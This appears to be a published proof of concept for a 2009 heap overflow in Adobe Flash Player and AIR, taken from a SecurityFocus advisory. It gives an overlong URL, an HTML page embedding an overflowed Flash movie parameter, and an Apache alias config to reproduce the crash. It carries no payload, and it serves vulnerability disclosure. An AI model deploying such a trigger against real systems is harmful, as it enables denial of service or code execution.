@@ -1,0 +1,65 @@
+source: http://www.securityfocus.com/bid/35902/info
+
+
+Adobe Flash Player and Adobe AIR are prone to a heap-based buffer-overflow vulnerability.
+
+Attackers can exploit this issue to execute arbitrary code in the context of the application. Failed attacks may cause a denial-of-service condition.
+
+This issue was previously covered in BID 35890 (Adobe Flash Player and AIR Multiple Security Vulnerabilities) but has been given its own record to better document it.
+
+UPDATE (September 4, 2009): Mac OS X 10.6 reportedly ships with Flash Player 10.0.23.1, which will overwrite any installed version of Flash Player when Mac OS X is being installed.
+
+This issue affects versions *prior to* the following:
+
+Flash Player 10.0.32.18
+AIR 1.5.2
+
+Request:
+http://localhost:8080/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/FlashTest.htm
+
+Html source of FlashTest.htm:
+<html>
+    <body>
+        <br />----- <br />
+        <script>
+            var movieName = &#039;&#039;;
+            var flash = &#039;&#039;;
+           
+            function getMovieName()
+            {
+                movieName = &#039;a.swf?<overflowed>&#039;;
+            }
+           
+            function printFlash()
+            {
+                               
+                flash += &#039;<OBJECT &#039;;
+                flash += &#039;ID="something"&#039;;
+                flash += &#039;classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" &#039;;
+                flash += &#039;codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=5,0,0,0"&#039;;
+                flash += &#039;WIDTH="70"&#039;;
+                flash += &#039;HEIGHT="90"&#039;;
+                flash += &#039;>&#039;;
+                flash += &#039;<PARAM &#039;;
+                flash += &#039;  NAME="movie"&#039;;
+                flash += &#039;  VALUE="&#039; + movieName + &#039;"&#039;;
+                flash += &#039;</OBJECT>&#039;;
+            }
+            getMovieName();
+            printFlash();
+            document.write(flash);
+        </script>
+        <br />----- <br />
+    </body>
+</html>
+
+
+Apache config:
+Alias /aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa "C:/Inetpub/wwwroot/"
+
+<Directory "C:/Inetpub/wwwroot/">
+    AllowOverride None
+    Options All
+    Order allow,deny
+    Allow from all
+</Directory>
